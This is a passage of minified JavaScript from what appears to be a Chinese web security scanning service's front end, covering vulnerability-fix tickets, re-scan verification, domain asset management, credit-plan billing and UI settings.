t==="fixed"?(d="工单已完成修复闭环，建议保留复测记录与变更证据。",u="归档本次修复结果，并将同类问题纳入后续版本基线。"):t==="failed"?(d="本次修复未通过验证，需要回看失败原因后重新推进。",u="优先检查变更是否完整生效，再安排二次修复和复测。"):t==="rolled_back"?(d="当前工单已回滚，建议先恢复稳定状态再评估新的修复方案。",u="确认回滚影响范围，补齐更稳的修复计划后再重新应用。"):t==="applying"||t==="in_progress"?(d="修复正在推进中，当前重点是确认变更落地并尽快复测。",u="等待配置或代码变更生效后，立即发起复测验证。"):t==="confirmed"&&(d="问题已确认，建议尽快进入实施阶段，避免风险长期暴露。",u="将修复动作落到配置、代码或访问控制上，并保留变更记录。"),(r==="critical"||r==="high")&&t!=="fixed"&&(u="该项等级较高，建议优先安排处理窗口并同步复测计划。"),{headline:d,nextStep:u,progressText:"已完成 "+a+"/"+s.length+" 个闭环阶段",latestTime:n?n.time:"",failedLabel:o?o.label:""}}function Hn(e){return(Array.isArray(e)?e:[]).map(function(t){const r=zi(t,[]);return["工单 #"+t.id,"名称: "+(t.finding_name||""),"等级: "+(Ve.severityLabel(t.severity)||t.severity||""),"状态: "+(Ve.statusLabel(t.status)||t.status||""),"负责人: "+(t.owner||"未指定"),"处理人: "+(t.assignee||"未指定"),"复核人: "+(t.reviewer||"未指定"),"来源 URL: "+(t.url||""),"备注: "+(t.notes||"无"),"闭环摘要: "+r.headline,"下一步: "+r.nextStep].join(`
`)}).join(`

--------------------

`)}function Ua(e){if(Wi)return;Wi=!0;const i=document.body;i&&(i.addEventListener("click",$a),i.addEventListener("change",qa))}function $a(e){if(e.target.closest(".ticket-checkbox")||e.target.closest(".ticket-check"))return;const i=e.target.closest("[data-action]");if(!i)return;const t=i.dataset.action,r=i.dataset.id?parseInt(i.dataset.id,10):null,s=i.dataset.status||null;switch(t){case"switch-ticket-tab":s&&Wa(s);break;case"show-detail":r&&gt(r);break;case"verify":r&&ro(r);break;case"edit-notes":r&&Ka(r);break;case"open-fixer":r&&Un(r);break;case"open-report":r&&eo(r);break;case"copy-summary":r&&to(r);break;case"edit-owner":r&&Ya(r);break;case"edit-collaborators":r&&Qa(r);break;case"export-ticket":r&&io(r);break;case"delete":r&&Ja(r);break;case"batch-update":s&&Za(s);break;case"batch-delete":Xa();break;case"batch-export":Va();break;case"toggle-select-all":Dn(i);break}}function qa(e){const i=e.target;if(i.classList.contains("ticket-checkbox")){Ii();return}const t=i.closest("[data-action]");if(!t)return;const r=t.dataset.action,s=t.dataset.id?parseInt(t.dataset.id,10):null;switch(r){case"change-status":s&&Ga(s,i.value);break;case"toggle-select-all":Dn(i);break}}function Wa(e){La(e),document.querySelectorAll(".ticket-tab").forEach(function(i){i.classList.toggle("active",i.dataset.status===e)}),Nn()}function Xe(){if(!he()){$e("ticket-workbench","none"),$e("ticket-empty","block"),$e("ticket-batch-bar","none"),Ki("ticket-empty",'<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>请先登录查看工单</p></div>');return}return Aa().then(function(){Nn()}).catch(function(e){T("加载工单失败: "+e.message,"error")})}function Nn(){let e=document.getElementById("ticket-list"),i=document.getElementById("ticket-empty"),t=document.getElementById("ticket-batch-bar"),r=document.getElementById("ticket-workbench"),s=document.getElementById("ticket-detail-panel");if(!e)return;let a=Ba();if(a.length===0){e.innerHTML="",i&&(i.style.display="block"),t&&(t.style.display="none"),r&&(r.style.display="none"),s&&(s.innerHTML='<div class="ticket-detail-empty">选择左侧工单查看详情</div>');return}i&&(i.style.display="none"),t&&(t.style.display="flex"),r&&(r.style.display="flex");let o="";a.forEach(function(n){let d=Ve.severityClass(n.severity),u=Ve.severityLabel(n.severity),h=Ve.statusLabel(n.status);o+='<tr class="ticket-row" data-action="show-detail" data-id="'+n.id+'">',o+='<td><label class="ticket-check"><input type="checkbox" class="ticket-checkbox" value="'+n.id+'"></label></td>',o+='<td class="ticket-title-cell">'+w(n.finding_name)+"</td>",o+='<td><span class="ticket-severity '+d+'">'+u+"</span></td>",o+='<td><span class="ticket-status-badge">'+h+"</span></td>",o+='<td class="ticket-date-cell">'+(n.created_at||"")+"</td>",o+="</tr>"}),e.innerHTML=o,Ii()}function gt(e){let i=rt(e);if(!i)return;let t=document.getElementById("ticket-detail-panel");if(!t)return;let r=Ve.severityClass(i.severity),s=Ve.severityLabel(i.severity),a=Ve.statusLabel(i.status),o='<div class="ticket-detail-header">';o+='<div class="ticket-detail-title">'+w(i.finding_name)+"</div>",o+='<div class="ticket-detail-badges"><span class="ticket-severity '+r+'">'+s+'</span><span class="ticket-status-badge">'+a+"</span></div>",o+="</div>",o+='<div class="ticket-detail-meta">工单 #'+i.id+(i.scan_id?" · 扫描 #"+i.scan_id:"")+" · "+(i.created_at||"")+"</div>",o+='<div class="ticket-owner-bar"><div class="ticket-owner-chip">负责人：'+w(i.owner||"未指定")+"</div>",o+='<div class="ticket-owner-chip">处理人：'+w(i.assignee||"未指定")+"</div>",o+='<div class="ticket-owner-chip">复核人：'+w(i.reviewer||"未指定")+"</div>",o+='<div class="ticket-owner-chip subtle">目标：'+w(i.target_host||i.url||"未记录")+"</div></div>",o+='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">',o+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">建议：'+(i.status==="fixed"?"尽快复测确认":i.status==="failed"?"回看失败原因并回滚":i.status==="applying"?"等待变更生效后复测":"推进修复并保留变更记录")+"</div>",o+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">优先级：'+s+"</div>",i.finding_type&&(o+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">类型：'+w(i.finding_type)+"</div>"),o+="</div>";let n=zi(i,[]);if(o+='<div class="ticket-closure-card">',o+='<div class="ticket-closure-title">闭环摘要</div>',o+='<div class="ticket-closure-headline">'+w(n.headline)+"</div>",o+='<div class="ticket-closure-progress">'+w(n.progressText)+"</div>",o+='<div class="ticket-closure-next">下一步：'+w(n.nextStep)+"</div>",o+="</div>",o+='<div class="ticket-detail-section"><div class="ticket-detail-label">修复闭环</div>',o+='<div class="ticket-timeline" id="ticket-timeline-'+i.id+'"><div class="ticket-timeline-loading">正在读取时间线...</div></div></div>',o+='<div class="ticket-detail-section"><div class="ticket-detail-label">操作历史</div><div class="ticket-activity-list" id="ticket-activity-'+i.id+'"><div class="ticket-timeline-loading">正在读取操作历史...</div></div></div>',i.fix_code&&(o+='<div class="ticket-detail-section"><div class="ticket-detail-label">修复代码</div><pre class="ticket-detail-code">'+w(i.fix_code)+"</pre></div>"),i.url&&(o+='<div class="ticket-detail-section"><div class="ticket-detail-label">漏洞位置</div><code class="ticket-detail-url">'+w(i.url)+"</code></div>"),i.notes&&(o+='<div class="ticket-detail-section"><div class="ticket-detail-label">备注</div><div class="ticket-detail-notes">'+w(i.notes)+"</div></div>"),i.diff_summary&&i.diff_summary!=="{}")try{let d=JSON.parse(i.diff_summary);o+='<div class="ticket-detail-section"><div class="ticket-detail-label">复测结果</div>',o+='<div class="ticket-diff-summary">',d.verified_fixed&&(o+='<div class="ticket-diff-item success">已验证修复</div>'),d.summary&&(o+='<div class="ticket-diff-stats">消除 '+(d.summary.eliminated_count||0)+" · 新增 "+(d.summary.new_count||0)+" · 保留 "+(d.summary.retained_count||0)+"</div>",o+='<div class="ticket-diff-score">评分变化：'+(d.before_score||0)+" → "+(d.after_score||0)+" ("+(d.score_delta>0?"+":"")+d.score_delta+")</div>"),o+="</div></div>"}catch{}o+='<div class="ticket-detail-actions">',o+='<select class="ticket-status-select" data-action="change-status" data-id="'+i.id+'" title="选择当前修复进度">',o+='<option value="pending"'+(i.status==="pending"?" selected":"")+">待修复</option>",o+='<option value="confirmed"'+(i.status==="confirmed"?" selected":"")+">已确认</option>",o+='<option value="applying"'+(i.status==="applying"?" selected":"")+">应用中</option>",o+='<option value="in_progress"'+(i.status==="in_progress"?" selected":"")+">修复中</option>",o+='<option value="fixed"'+(i.status==="fixed"?" selected":"")+">已修复</option>",o+='<option value="failed"'+(i.status==="failed"?" selected":"")+">修复失败</option>",o+='<option value="rolled_back"'+(i.status==="rolled_back"?" selected":"")+">已回滚</option>",o+='<option value="ignored"'+(i.status==="ignored"?" selected":"")+">已忽略</option>",o+="</select>",o+='<button class="ticket-btn primary" data-action="verify" data-id="'+i.id+'">复测验证</button>',o+='<button class="ticket-btn secondary" data-action="open-fixer" data-id="'+i.id+'">去修复器</button>',o+='<button class="ticket-btn secondary" data-action="open-report" data-id="'+i.id+'">回到报告</button>',o+='<button class="ticket-btn secondary" data-action="copy-summary" data-id="'+i.id+'">复制摘要</button>',o+='<button class="ticket-btn secondary" data-action="edit-owner" data-id="'+i.id+'">负责人</button>',o+='<button class="ticket-btn secondary" data-action="edit-collaborators" data-id="'+i.id+'">分派协同</button>',o+='<button class="ticket-btn secondary" data-action="edit-notes" data-id="'+i.id+'">备注</button>',o+='<button class="ticket-btn secondary" data-action="export-ticket" data-id="'+i.id+'">导出工单</button>',o+='<button class="ticket-btn danger" data-action="delete" data-id="'+i.id+'">删除</button>',o+="</div>",t.innerHTML=o,no(i.id),document.querySelectorAll(".ticket-row").forEach(function(d){d.classList.toggle("selected",parseInt(d.dataset.id)===e)})}function Ii(){let e=document.querySelectorAll(".ticket-checkbox:checked"),i=document.getElementById("ticket-selected-count");i&&(i.textContent="已选 "+e.length+" 项")}function Dn(e){let i=e?e.checked:!1;document.querySelectorAll(".ticket-checkbox").forEach(function(t){t.checked=i}),document.querySelectorAll('[data-action="toggle-select-all"]').forEach(function(t){t.checked=i}),Ii()}function Ci(){let e=[];return document.querySelectorAll(".ticket-checkbox:checked").forEach(function(i){e.push(parseInt(i.value,10))}),e}function Za(e){let i=Ci();if(i.length===0){T("请先选择工单","error");return}ja(i,e).then(function(){return T("已批量更新 "+i.length+" 个工单","success"),Xe()}).catch(function(t){T("批量更新失败: "+t.message,"error")})}function Xa(){let e=Ci();if(e.length===0){T("请先选择工单","error");return}confirm("确定删除选中的 "+e.length+" 个工单？")&&Ha(e).then(function(){return T("已批量删除 "+e.length+" 个工单","success"),Xe()}).catch(function(i){T("批量删除失败: "+i.message,"error")})}function Va(){let e=Ci();if(e.length===0){T("请先选择工单","error");return}let t=me.getState().tickets.filter(function(n){return e.indexOf(n.id)!==-1}),r=Hn(t);const s=new Blob([r],{type:"text/plain;charset=utf-8"}),a=URL.createObjectURL(s),o=document.createElement("a");o.href=a,o.download="ticket-summary-"+new Date().toISOString().slice(0,10)+".txt",document.body.appendChild(o),o.click(),o.remove(),setTimeout(function(){URL.revokeObjectURL(a)},1e3),T("已导出 "+e.length+" 个工单摘要","success")}function Ga(e,i){Oa(e,i).then(function(){return T("状态已更新","success"),Xe().then(function(){gt(e)})}).catch(function(t){T("更新失败: "+t.message,"error")})}function Ja(e){confirm("确定删除该工单？")&&Fa(e).then(function(){T("工单已删除","success");let i=document.getElementById("ticket-detail-panel");return i&&(i.innerHTML='<div class="ticket-detail-empty">选择左侧工单查看详情</div>'),Xe()}).catch(function(i){T("删除失败: "+i.message,"error")})}function Ka(e){let i=rt(e),t=prompt("编辑备注:",i&&i.notes?i.notes:"");t!==null&&Ra(e,t).then(function(){return T("备注已保存","success"),Xe().then(function(){gt(e)})}).catch(function(r){T("保存失败: "+r.message,"error")})}function Ya(e){let i=rt(e),t=me.getState(),r=Array.isArray(t.ticketCollaborators)?t.ticketCollaborators:[],s=r.length?`
可选成员: `+r.join(" / "):"",a=prompt("设置负责人:"+s,i&&i.owner?i.owner:"");a!==null&&Ma(e,a).then(function(){return T("负责人已更新","success"),Xe().then(function(){gt(e)})}).catch(function(o){T("更新失败: "+o.message,"error")})}function Qa(e){let i=rt(e),t=me.getState(),r=Array.isArray(t.ticketCollaborators)?t.ticketCollaborators:[],s=r.length?`
可选成员: `+r.join(" / "):"",a=prompt("设置处理人:"+s,i&&i.assignee?i.assignee:"");if(a===null)return;let o=prompt("设置复核人:"+s,i&&i.reviewer?i.reviewer:"");o!==null&&Pa(e,{assignee:a,reviewer:o}).then(function(){return T("协同分派已更新","success"),Xe().then(function(){gt(e)})}).catch(function(n){T("更新失败: "+n.message,"error")})}function Un(e){let i=rt(e);if(i){try{i.url&&window.localStorage&&localStorage.setItem("vs_fixer_ticket",JSON.stringify({ticket_id:i.id,scan_id:i.scan_id||null,url:i.url,finding_name:i.finding_name||"",finding_type:i.finding_type||"",severity:i.severity||"low"}))}catch{}typeof window.navigateTo=="function"?window.navigateTo("fixer"):window.location.hash="#page-fixer"}}function eo(e){rt(e)&&(typeof window.navigateTo=="function"?window.navigateTo("home"):window.location.hash="#page-home")}function to(e){let i=rt(e);if(!i)return;let t=Hn([i])+`
备注: `+(i.notes||"");kt(t).then(function(){T("工单摘要已复制")})}function io(e){Da(e,"markdown").then(function(i){return i.blob().then(function(t){const r=URL.createObjectURL(t),s=document.createElement("a");s.href=r,s.download="fix-ticket-"+e+".md",document.body.appendChild(s),s.click(),s.remove(),setTimeout(function(){URL.revokeObjectURL(r)},1e3),T("工单导出已开始","success")})}).catch(function(){T("导出失败","error")})}function no(e){let i=document.getElementById("ticket-timeline-"+e),t=document.getElementById("ticket-activity-"+e);i&&ke("/api/fix-tickets/"+e+"/timeline").then(function(r){let s=r&&r.data?r.data:r;if(!s||!s.timeline){i.innerHTML='<div class="ticket-timeline-empty">暂无时间线数据</div>',t&&(t.innerHTML='<div class="ticket-timeline-empty">暂无操作记录</div>');return}let a='<div class="ticket-timeline-steps">';s.timeline.forEach(function(n,d){let u="step-"+n.status,h={done:"✓",doing:"●",pending:"○",failed:"✗",rolled_back:"↩"}[n.status]||"○";a+='<div class="ticket-timeline-step '+u+'">',a+='<div class="ticket-timeline-icon">'+h+"</div>",a+='<div class="ticket-timeline-content">',a+='<div class="ticket-timeline-label">'+w(n.label)+"</div>",n.time&&(a+='<div class="ticket-timeline-time">'+w(n.time)+"</div>"),a+="</div></div>",d<s.timeline.length-1&&(a+='<div class="ticket-timeline-line"></div>')}),a+="</div>",i.innerHTML=a;let o=i.parentElement?i.parentElement.parentElement.querySelector(".ticket-closure-card"):null;if(o&&s.ticket){let n=zi(s.ticket,s.timeline);o.innerHTML='<div class="ticket-closure-title">闭环摘要</div><div class="ticket-closure-headline">'+w(n.headline)+'</div><div class="ticket-closure-progress">'+w(n.progressText)+"</div>"+(n.latestTime?'<div class="ticket-closure-progress">最近进展：'+w(n.latestTime)+"</div>":"")+(n.failedLabel?'<div class="ticket-closure-progress">当前阻塞：'+w(n.failedLabel)+"</div>":"")+'<div class="ticket-closure-next">下一步：'+w(n.nextStep)+"</div>"}if(t){let n=Array.isArray(s.activities)?s.activities:[];n.length===0?t.innerHTML='<div class="ticket-timeline-empty">暂无操作记录</div>':t.innerHTML=n.map(function(d){let u=d.event_type==="note"?"备注更新":d.event_type==="owner"?"负责人调整":d.event_type==="assignee"?"处理人调整":d.event_type==="reviewer"?"复核人调整":"状态流转",h=d.note?'<div class="ticket-activity-note">'+w(d.note)+"</div>":"";return'<div class="ticket-activity-item"><div class="ticket-activity-head"><span class="ticket-activity-type">'+u+'</span><span class="ticket-activity-time">'+w(d.created_at||"")+"</span></div>"+h+"</div>"}).join("")}}).catch(function(){i.innerHTML='<div class="ticket-timeline-empty">加载失败</div>',t&&(t.innerHTML='<div class="ticket-timeline-empty">加载失败</div>')})}function ro(e){if(!confirm("确定对工单 #"+e+" 复测验证？系统会重新扫描并对比修复效果。"))return;let i=document.querySelector('.ticket-detail-actions [data-action="verify"][data-id="'+e+'"]');i&&(i.textContent="验证中...",i.disabled=!0),Na(e).then(function(t){if(Kt(t)){T($t(t),"error"),He();return}if(t&&t.success){let r=t.status==="fixed"?"复测通过：漏洞已修复！":"复测完成：漏洞仍存在";return T(r,t.status==="fixed"?"success":"warning"),He(),t.status==="fixed"&&setTimeout(function(){Un(e)},300),Xe().then(function(){gt(e)})}else T("验证失败："+(t&&t.error?t.error:"未知错误"),"error")}).catch(function(t){T("验证请求失败","error")}).finally(function(){i&&(i.textContent="复测验证",i.disabled=!1)})}function so(){try{return localStorage.getItem("vs_token")}catch{return null}}function ao(){return!!so()}function oo(e){if(!e)return"未知错误";if(typeof e.error=="string"&&e.error)return e.error;if(typeof e.detail=="string"&&e.detail)return e.detail;if(typeof e.message=="string"&&e.message)return e.message;if(Array.isArray(e.detail)&&e.detail.length>0){let i=e.detail.map(function(t){return t&&typeof t.msg=="string"?t.msg:t&&typeof t=="string"?t:""}).filter(Boolean);if(i.length>0)return i.join("；")}return"未知错误"}let ot=[];function lo(){if(!ao()){Ki("asset-list",""),$e("asset-empty","block");let e=document.getElementById("asset-empty");e&&(e.innerHTML='<div class="ticket-empty-icon"></div><p>请先登录查看资产</p><p class="ticket-empty-hint">登录后管理您的域名资产</p>');return}ce("/api/assets").then(function(e){return e.json()}).then(function(e){e&&e.assets?(ot=e.assets,si(ot)):(ot=[],si(ot))}).catch(function(e){T("加载资产失败: "+e.message,"error"),ot=[],si(ot)})}function si(e){let i=document.getElementById("asset-list"),t=document.getElementById("asset-empty");if(!i)return;if(!e||e.length===0){i.innerHTML="",t&&(t.style.display="block",t.innerHTML='<div class="ticket-empty-icon"></div><p>暂无资产</p><p class="ticket-empty-hint">添加您的第一个域名资产，开始安全扫描</p>');return}t&&(t.style.display="none");let r='<div class="asset-table-wrap"><table class="asset-table">';r+="<thead><tr><th>域名</th><th>负责人</th><th>验证状态</th><th>评分</th><th>操作</th></tr></thead><tbody>",e.forEach(function(s){let a=s.verified||!1,o=a?"verified":"pending",n=a?"已验证":"待人工复核",d=s.score,u="high";d==null?(d="-",u=""):d<50?u="low":d<75&&(u="medium"),r+="<tr>",r+='<td data-label="域名"><div class="asset-domain">'+w(s.domain||"")+'</div><div class="asset-meta">'+w(s.description||"")+"</div></td>",r+='<td data-label="负责人">'+w(s.owner||"-")+"</td>",r+='<td data-label="验证状态"><span class="asset-badge '+o+'">'+n+"</span></td>",r+='<td data-label="评分"><div class="asset-score '+u+'">'+d+"</div></td>",r+='<td data-label="操作"><div class="asset-actions">',r+='<button class="asset-btn primary" onclick="scanAsset('+s.id+", '"+xe(s.domain||"")+`')">扫描</button>`,r+='<button class="asset-btn secondary" onclick="editAsset('+s.id+')">编辑</button>',r+='<button class="asset-btn danger" onclick="deleteAsset('+s.id+')">删除</button>',r+="</div></td>",r+="</tr>"}),r+="</tbody></table></div>",i.innerHTML=r}function co(){let e=document.getElementById("asset-domain").value.trim(),i=document.getElementById("asset-owner").value.trim(),t=document.getElementById("asset-description").value.trim(),r=document.getElementById("asset-form-error");if(!e){r&&(r.textContent="请输入域名",r.style.display="block");return}r&&(r.style.display="none"),ce("/api/assets",{method:"POST",body:JSON.stringify({domain:e,owner:i,description:t})}).then(function(s){return s.json()}).then(function(s){if(s.id||s.asset_id)T("资产添加成功","success"),document.getElementById("asset-domain").value="",document.getElementById("asset-owner").value="",document.getElementById("asset-description").value="",lo();else{let a=oo(s)||"添加失败";r&&(r.textContent=a,r.style.display="block")}}).catch(function(s){r&&(r.textContent="添加失败: "+s.message,r.style.display="block")})}const $n=(...e)=>typeof window.navigateTo=="function"&&window.navigateTo(...e),Ti=()=>typeof window.updateUserCredits=="function"&&window.updateUserCredits();function qn(e){return e==null?"--":"¥"+(e/100).toFixed(2)}function po(e){if(e==null)return"--";let i=parseInt(e,10);return isNaN(i)?String(e):i.toLocaleString("zh-CN")}function uo(e){let i=parseInt(e&&e.credits,10),t=parseInt(e&&e.price_cents,10);return!i||!t?"--":(t/i/100).toFixed(2)}function fo(e){if(!e||!e.length)return null;let i=null,t=Number.POSITIVE_INFINITY;return e.forEach(function(r){let s=parseInt(r.credits,10),a=parseInt(r.price_cents,10);if(!s||!a)return;let o=a/s;o<t&&(t=o,i=r.id)}),i}function go(e,i){return e.id===i?"推荐":(e.name||"").includes("企业")?"企业版":(e.name||"").includes("专业")?"专业版":(e.name||"").includes("标准")?"标准版":(e.name||"").includes("体验")?"体验版":""}function vo(e){const i=(e.name||"").toLowerCase();return i.includes("企业")?"团队采购 / 扩容":i.includes("专业")?"安全运营 / 交付":i.includes("标准")?"日常扫描 / 复测":i.includes("体验")?"入门起步":"个人 / 试点使用"}function ho(e){const i=parseInt(e&&e.credits,10)||0;return i>=1e3?"企业采购":i>=500?"专业运营":i>=100?"标准使用":"入门起步"}function mo(e){return{mock:"开发环境通道",stripe:"Stripe",alipay:"支付宝",wechat:"微信支付"}[e]||e}function yo(e){return{pending:"待支付",paid:"已到账",failed:"失败",cancelled:"已取消"}[e]||e}function Wn(){if(!he()){T("请先登录后再查看服务套餐","warn"),$n("profile");return}bo(),zt(),ko()}function bo(){let e=document.getElementById("billing-plans-list");e&&(e.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在加载服务套餐...</div>',jr().then(function(i){let t=i&&i.data&&i.data.plans||i&&i.plans||[];if(!t.length){e.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">暂无可用服务套餐</div>';return}let r=fo(t),s='<div style="display:flex;flex-direction:column;gap:12px">';s+='<div style="display:flex;flex-wrap:wrap;gap:10px;padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:2px;font-size:12px;color:var(--text-secondary)">',s+="<div>• 所有订单都会进入服务记录，便于财务对账与追踪</div>",s+="<div>• 额度可立即用于体检、复测、修复验证、报告导出和审计留痕</div>",s+="<div>• 生产环境默认仅开放真实支付；开发环境可用通道</div>",s+="</div>",s+='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px">',t.forEach(function(a){let o=a.id===r,n=go(a,r),d=o?"var(--warning)":"var(--border)",u=o?"0 0 0 1px rgba(240,167,50,0.35)":"none";s+='<div style="background:var(--bg);border:1px solid '+d+";box-shadow:"+u+';border-radius:2px;padding:14px;display:flex;flex-direction:column;gap:8px;position:relative">',n&&(s+='<div style="position:absolute;top:10px;right:10px;background:'+(o?"var(--warning)":"var(--primary)")+';color:#fff;font-size:11px;font-weight:700;padding:3px 8px;border-radius:999px">'+w(n)+"</div>"),s+='<div style="font-size:15px;font-weight:700">'+w(a.name)+"</div>",s+='<div style="font-size:12px;color:var(--text-secondary);min-height:34px">'+w(a.description||"")+"</div>",s+='<div style="font-size:22px;font-weight:700;color:var(--warning)">'+qn(a.price_cents)+"</div>",s+='<div style="font-size:13px;color:var(--text-secondary)">含 <strong style="color:var(--text)">'+po(a.credits)+"</strong> 积分</div>",s+='<div style="font-size:12px;color:var(--text-secondary)">约 <strong style="color:var(--text)">'+uo(a)+" 元/积分</strong></div>",s+='<div style="font-size:12px;color:var(--text-secondary)">适合：'+w(vo(a))+"</div>",s+='<div style="font-size:12px;color:var(--text-secondary)">可用于：扫描 / 复扫 / 报告 / 工单 / 审计</div>',s+='<div style="font-size:12px;color:var(--text-secondary)">权限：'+w(ho(a))+"</div>",s+='<button class="fixer-btn primary" style="width:100%;margin-top:auto" onclick="buyPlan('+a.id+', event)">立即购买</button>',s+="</div>"}),s+="</div>",s+='<div style="padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:2px;font-size:12px;color:var(--text-secondary);line-height:1.7">',s+='<div style="font-weight:700;color:var(--text);margin-bottom:4px">购买后流程</div>',s+="<div>1. 选择套餐并完成支付 → 2. 积分立即到账 → 3. 直接进入扫描或复扫 → 4. 结果会进入报告、工单和审计 → 5. 可按项目或团队需求继续升级。</div>",s+="</div>",s+='<div style="margin-top:12px;padding:12px 14px;background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.2);border-radius:2px;font-size:12px;color:var(--text-secondary);line-height:1.7">',s+='<div style="font-weight:700;color:var(--primary);margin-bottom:4px">交付前确认</div>',s+="<div>建议上线前重点确认：支付回调签名、积分扣减日志、权限分层、导出权限、审计日志留存，以及客户能否看懂套餐价值与结果证据。</div>",s+="</div>",e.innerHTML=s}).catch(function(i){e.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">加载套餐失败</div>'}))}function xo(e,i){if(i&&i.stopPropagation(),!he()){T("请先登录","warn"),$n("profile");return}let t="mock";window.__STRIPE_PUBLISHABLE_KEY__&&(t="stripe");let r=(window.__PUBLIC_BASE_URL__||window.location.origin).replace(/\/$/,"");Hr({plan_id:e,provider:t,success_url:r+"/billing?status=success",cancel_url:r+"/billing?status=cancel"}).then(function(s){if(!s||!s.success){T(qe(s)||"创建订单失败","error");return}s.data&&s.data.checkout_url?window.location.href=s.data.checkout_url:s.data&&s.data.transaction_id?(T("支付成功，积分已到账","success"),Ti(),zt()):T("订单状态异常","error")}).catch(function(s){T("购买失败："+(s.message||"网络错误"),"error")})}function zt(e){e=parseInt(e,10)||1;let i=10,t=(e-1)*i,r=document.getElementById("billing-records-list");r&&(r.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取充值记录...</div>',Dr(i,t).then(function(s){let a=s&&s.data&&s.data.records||s&&s.records||[],o=s&&s.data&&s.data.total||s&&s.total||a.length,n=s&&s.meta||{},d=n.limit||i,u=n.offset||t,h=Math.floor(u/d)+1,c=Math.max(1,Math.ceil(o/d));wo(a),hi("billing-records-pagination",h,c,function(p){zt(p)}),$e("billing-records-pagination",c>1?"flex":"none")}).catch(function(s){r.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">读取充值记录失败</div>'}))}function wo(e){let i=document.getElementById("billing-records-list");if(!i)return;if(!e||!e.length){i.innerHTML='<div style="text-align:center;padding:24px;color:var(--text-secondary)">暂无服务记录</div>';return}let t='<div style="display:flex;flex-direction:column;gap:8px">';e.forEach(function(r){let s=r.amount_cents?qn(r.amount_cents):"免费",a=r.status==="paid"?"var(--success)":r.status==="pending"?"var(--warning)":"var(--danger)";t+='<div style="display:flex;align-items:center;justify-content:space-between;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px">',t+="<div>",t+='<div style="font-size:13px;font-weight:600">'+w(r.plan_name||"充值")+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">'+Jt(r.created_at)+" · "+mo(r.payment_provider)+"</div>",t+="</div>",t+='<div style="text-align:right">',t+='<div style="font-size:13px;font-weight:700">'+s+"</div>",t+='<div style="font-size:11px;color:'+a+';margin-top:2px">'+yo(r.status)+"</div>",t+="</div></div>"}),t+="</div>",i.innerHTML=t}function ko(){let e=new URLSearchParams(window.location.search),i=e.get("status"),t=e.get("transaction_id");if(!(!i&&!t)){if(i==="cancel"){T("支付已取消","warn"),Zi();return}t?(T("正在确认支付结果...","success"),_o(t)):i==="success"&&(T("支付成功","success"),Ti(),zt()),Zi()}}function Zi(){try{let e=new URL(window.location.href);e.searchParams.delete("status"),e.searchParams.delete("transaction_id"),window.history.replaceState({},"",e.toString())}catch{}}function _o(e){let i=0,t=10,r=setInterval(function(){i++,Nr(e).then(function(s){let a=s&&s.data||s;if(a&&a.status==="paid"){clearInterval(r),T("支付成功，积分已到账","success"),Ti(),zt();return}i>=t&&(clearInterval(r),T("支付结果确认超时，请稍后刷新查看","warn"))}).catch(function(){i>=t&&clearInterval(r)})},2e3)}function So(){typeof window<"u"&&(window.buyPlan=xo,window.loadBillingPage=Wn)}let fi=null;const Xi={"en-US":{scanSettings:"Scan settings",language:"界面语言 / Language",autoSave:"Automatically save scan results",darkMode:"Dark mode",scanNotify:"Scan completion notifications"},"zh-CN":{scanSettings:"扫描设置",language:"界面语言 / Language",autoSave:"自动保存扫描结果",darkMode:"深色模式",scanNotify:"扫描完成提醒"}};function gi(e){const i=Xi[e]||Xi["zh-CN"];document.documentElement.lang=e,document.querySelectorAll("[data-i18n]").forEach(r=>{const s=r.getAttribute("data-i18n");i[s]&&(r.textContent=i[s])});const t=document.getElementById("ui-language-select");t&&(t.value=e);try{localStorage.setItem("vs_locale",e)}catch{}}function Eo(e){gi(e)}window.setUILanguage=Eo;(function(){var i=!1;function t(r){if(!i){i=!0;try{let s=document.createElement("div");s.style.cssText="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);color:#fff;z-index:99999;display:flex;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif",s.innerHTML='<div style="max-width:500px;padding:30px;background:#1e293b;border-radius:2px;text-align:center;border:1px solid #c75450"><div style="font-size:48px;margin-bottom:12px">!</div><h2 style="margin:0 0 8px;color:#c75450">页面遇到错误</h2><p style="color:#94a3b8;font-size:14px;margin:0 0 16px;line-height:1.6">页面运行过程中出现了未预期的错误，可以刷新页面试试。</p><p style="color:#64748b;font-size:12px;margin:0 0 16px;font-family:monospace;word-break:break-all">'+(r||"未知错误").substring(0,200)+'</p><button onclick="location.reload()" style="background:#4b6eaf;color:#fff;border:none;padding:10px 24px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600">刷新页面</button></div>',document.body.appendChild(s)}catch(s){console.error("Global error handler failed:",s)}}}window.addEventListener("error",function(r){console.error("Global error:",r.error||r.message),!(r.target&&r.target!==window&&(r.target.tagName==="IMG"||r.target.tagName==="LINK"||r.target.tagName==="SCRIPT"))&&t(r.message||String(r.error))},!0),window.addEventListener("unhandledrejection",function(r){console.error("Unhandled promise rejection:",r.reason)})})();function Se(e){return document.getElementById(e)||null}function zo(e,i){let t=Se(e);t&&(t.innerHTML=i)}function Io(e,i){let t=Se(e);t&&(t.style.display=i)}function Zn(e){document.readyState==="loading"?document.addEventListener("DOMContentLoaded",e,{once:!0}):setTimeout(e,0)}function Vi(e,i){let t=document.getElementById(e),r=document.getElementById(i);!t||!r||t.addEventListener("change",function(){typeof 